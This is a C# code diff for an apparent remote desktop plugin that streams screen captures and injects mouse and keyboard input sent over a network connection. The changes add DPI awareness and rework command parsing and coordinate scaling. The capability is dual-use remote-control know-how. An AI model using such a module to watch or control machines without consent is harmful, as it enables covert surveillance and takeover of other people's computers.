@@ -21,6 +21,10 @@ namespace Plugin
         int quality = 100;
         int moniter_index = -1;
         double scale = 1;
+
+        [DllImport("SHCore.dll", SetLastError = true)]
+        public static extern int SetProcessDpiAwareness(int awareness);
+
         public async Task Run(Node node)
         {
             await node.SendAsync(new byte[] { 3 });//indicate that it has connected
@@ -29,6 +33,9 @@ namespace Plugin
                 ImageNode?.Disconnect();
                 node.Disconnect();
             }
+
+            SetProcessDpiAwareness(2);//2 is being aware of the dpi per monitor
+
             ScreenShotThread();
             byte[] data=null;
             try
@@ -41,108 +48,106 @@ namespace Plugin
                         ImageNode?.Disconnect();
                         break;
                     }
-                    try
+                    if (data[0] == 0)
                     {
-                        if (data[0] == 0)
-                        {
-                            playing = true;
-                        }
-                        else if (data[0] == 1)
-                        {
-                            playing = false;
-                        }
-                        else if (data[0] == 2)
-                        {
-                            string[] mons = ScreenshotTaker.AvailableMonitors();
-                            await node.SendAsync(node.sock.IntToBytes(mons.Length));
-                            foreach (string i in mons)
-                            {
-                                await node.SendAsync(Encoding.UTF8.GetBytes(i));
-                            }
-                        }
-                        else if (data[0] == 3)
-                        {
-                            quality = node.sock.BytesToInt(await node.ReceiveAsync());
-                        }
-                        else if (data[0] == 4)
-                        {
-                            Screen[] screens = Screen.AllScreens;
-                            moniter_index = node.sock.BytesToInt(await node.ReceiveAsync());
-                            await node.SendAsync(node.sock.IntToBytes(screens[moniter_index].Bounds.Width));
-                            await node.SendAsync(node.sock.IntToBytes(screens[moniter_index].Bounds.Height));
-                        }
-                        else if (data[0] == 5)
-                        {
-                            int x = node.sock.BytesToInt(await node.ReceiveAsync());
-                            int y = node.sock.BytesToInt(await node.ReceiveAsync());
-                            Point coords = new Point(x + Screen.AllScreens[moniter_index].Bounds.X, y + Screen.AllScreens[moniter_index].Bounds.Y);
-                            InputHandler.SimulateMouseClick(coords);
-                        }
-                        else if (data[0] == 6)
-                        {
-                            int x = node.sock.BytesToInt(await node.ReceiveAsync());
-                            int y = node.sock.BytesToInt(await node.ReceiveAsync());
-                            Point coords = new Point(x + Screen.AllScreens[moniter_index].Bounds.X, y + Screen.AllScreens[moniter_index].Bounds.Y);
-                            InputHandler.SimulateMouseDoubleClick(coords);
-                        }
-                        else if (data[0] == 7)
-                        {
-                            int x = node.sock.BytesToInt(await node.ReceiveAsync());
-                            int y = node.sock.BytesToInt(await node.ReceiveAsync());
-                            Point coords = new Point(x + Screen.AllScreens[moniter_index].Bounds.X, y + Screen.AllScreens[moniter_index].Bounds.Y);
-                            InputHandler.SimulateMouseUp(coords);
-                        }
-                        else if (data[0] == 8)
-                        {
-                            int x = node.sock.BytesToInt(await node.ReceiveAsync());
-                            int y = node.sock.BytesToInt(await node.ReceiveAsync());
-                            Point coords = new Point(x + Screen.AllScreens[moniter_index].Bounds.X, y + Screen.AllScreens[moniter_index].Bounds.Y);
-                            InputHandler.SimulateMouseDown(coords);
-
-                        }
-                        else if (data[0] == 9)
-                        {
-                            int x = node.sock.BytesToInt(await node.ReceiveAsync());
-                            int y = node.sock.BytesToInt(await node.ReceiveAsync());
-                            Point coords = new Point(x + Screen.AllScreens[moniter_index].Bounds.X, y + Screen.AllScreens[moniter_index].Bounds.Y);
-                            InputHandler.SimulateMouseRightClick(coords);
-                        }
-                        else if (data[0] == 10)
-                        {
-                            int x = node.sock.BytesToInt(await node.ReceiveAsync());
-                            int y = node.sock.BytesToInt(await node.ReceiveAsync());
-                            Point coords = new Point(x + Screen.AllScreens[moniter_index].Bounds.X, y + Screen.AllScreens[moniter_index].Bounds.Y);
-                            InputHandler.SimulateMouseMiddleClick(coords);
-                        }
-                        else if (data[0] == 11)
-                        {
-                            int x = node.sock.BytesToInt(await node.ReceiveAsync());
-                            int y = node.sock.BytesToInt(await node.ReceiveAsync());
-                            Point coords = new Point(x + Screen.AllScreens[moniter_index].Bounds.X, y + Screen.AllScreens[moniter_index].Bounds.Y);
-                            InputHandler.SimulateMouseMove(coords);
-                        }
-                        else if (data[0] == 12)
-                        {
-                            int keyCode = node.sock.BytesToInt(await node.ReceiveAsync());
-                            InputHandler.SimulateKeyPress(keyCode);
-                        }
-                        else if (data[0] == 13) 
-                        { 
-                            scale=(double)node.sock.BytesToInt(await node.ReceiveAsync())/10000.0;
-                        }
+                        playing = true;
                     }
-                    catch (Exception ex) 
+                    else if (data[0] == 1)
                     {
-                        //throw ex;
-                        if (ex.Message != "Index was outside the bounds of the array.") 
-                        { 
-                            throw ex;
+                        playing = false;
+                    }
+                    else if (data[0] == 2)
+                    {
+                        string[] mons = ScreenshotTaker.AvailableMonitors();
+                        string monsString = "";
+                        foreach (string i in mons)
+                        {
+                            monsString += i.Replace("\n", "-") + "\n";
                         }
+                        if (monsString != "")
+                        {
+                            monsString = monsString.Substring(0, monsString.Length - 1);//remove the ending newline
+                        }
+                        await node.SendAsync(Encoding.UTF8.GetBytes(monsString));
+                    }
+                    else if (data[0] == 3)
+                    {
+                        quality = node.sock.BytesToInt(data,1);
+                    }
+                    else if (data[0] == 4)
+                    {
+                        Screen[] screens = Screen.AllScreens;
+                        moniter_index = node.sock.BytesToInt(data,1);
+                        byte[] w = node.sock.IntToBytes(screens[moniter_index].Bounds.Width);
+                        byte[] h = node.sock.IntToBytes(screens[moniter_index].Bounds.Height);
+                        await node.SendAsync(SocketHandler.Concat(w,h));
+                    }
+                    else if (data[0] == 5)
+                    {
+                        int x = node.sock.BytesToInt(data, 1);
+                        int y = node.sock.BytesToInt(data, 5);
+                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
+                        InputHandler.SimulateMouseClick(coords);
+                    }
+                    else if (data[0] == 6)
+                    {
+                        int x = node.sock.BytesToInt(data, 1);
+                        int y = node.sock.BytesToInt(data, 5);
+                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
+                        InputHandler.SimulateMouseDoubleClick(coords);
+                    }
+                    else if (data[0] == 7)
+                    {
+                        int x = node.sock.BytesToInt(data, 1);
+                        int y = node.sock.BytesToInt(data, 5);
+                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
+                        InputHandler.SimulateMouseUp(coords);
+                    }
+                    else if (data[0] == 8)
+                    {
+                        int x = node.sock.BytesToInt(data, 1);
+                        int y = node.sock.BytesToInt(data, 5);
+                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
+                        InputHandler.SimulateMouseDown(coords);
+
+                    }
+                    else if (data[0] == 9)
+                    {
+                        int x = node.sock.BytesToInt(data, 1);
+                        int y = node.sock.BytesToInt(data, 5);
+                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
+                        InputHandler.SimulateMouseRightClick(coords);
+                    }
+                    else if (data[0] == 10)
+                    {
+                        int x = node.sock.BytesToInt(data, 1);
+                        int y = node.sock.BytesToInt(data, 5);
+                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
+                        InputHandler.SimulateMouseMiddleClick(coords);
+                    }
+                    else if (data[0] == 11)
+                    {
+                        int x = node.sock.BytesToInt(data,1);
+                        int y = node.sock.BytesToInt(data,5);
+                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
+
+                        InputHandler.SimulateMouseMove(coords);
+                        
+                    }
+                    else if (data[0] == 12)
+                    {
+                        int keyCode = node.sock.BytesToInt(data,1);
+                        InputHandler.SimulateKeyPress(keyCode);
+                    }
+                    else if (data[0] == 13) 
+                    {
+                        scale = (double)node.sock.BytesToInt(data,1)/10000.0;
                     }
                 }
             }
             catch
             {
+                ImageNode?.Disconnect();
             }
             GC.Collect();
         }
@@ -343,13 +348,11 @@ namespace Plugin
             }
 
             Screen selectedScreen = screens[screenIndex];
-            float scalingFactor = 1;//GetScalingFactor();
 
-            int screenLeft = (int)(selectedScreen.Bounds.Left * scalingFactor);
-            int screenTop = (int)(selectedScreen.Bounds.Top * scalingFactor);
-            int screenWidth = (int)(selectedScreen.Bounds.Width * scalingFactor);
-            int screenHeight = (int)(selectedScreen.Bounds.Height * scalingFactor);
-
+            int screenLeft = (int)(selectedScreen.Bounds.Left);
+            int screenTop = (int)(selectedScreen.Bounds.Top);
+            int screenWidth = (int)(selectedScreen.Bounds.Width);
+            int screenHeight = (int)(selectedScreen.Bounds.Height);
             Bitmap bitmap = new Bitmap(screenWidth, screenHeight, PixelFormat.Format24bppRgb);
             using (Graphics graphics = Graphics.FromImage(bitmap))
             {
@@ -387,26 +390,6 @@ namespace Plugin
                     return stream.ToArray();
                 }
             }
-        }
-        private static float GetScalingFactor()
-        {
-            using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
-            {
-                IntPtr desktop = graphics.GetHdc();
-                int logicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
-                int physicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);
-                float scalingFactor = (float)physicalScreenHeight / logicalScreenHeight;
-                return scalingFactor;
-            }
-        }
-
-        [DllImport("gdi32.dll")]
-        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
-
-        private enum DeviceCap
-        {
-            VERTRES = 10,
-            DESKTOPVERTRES = 117
         }
         private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
         {
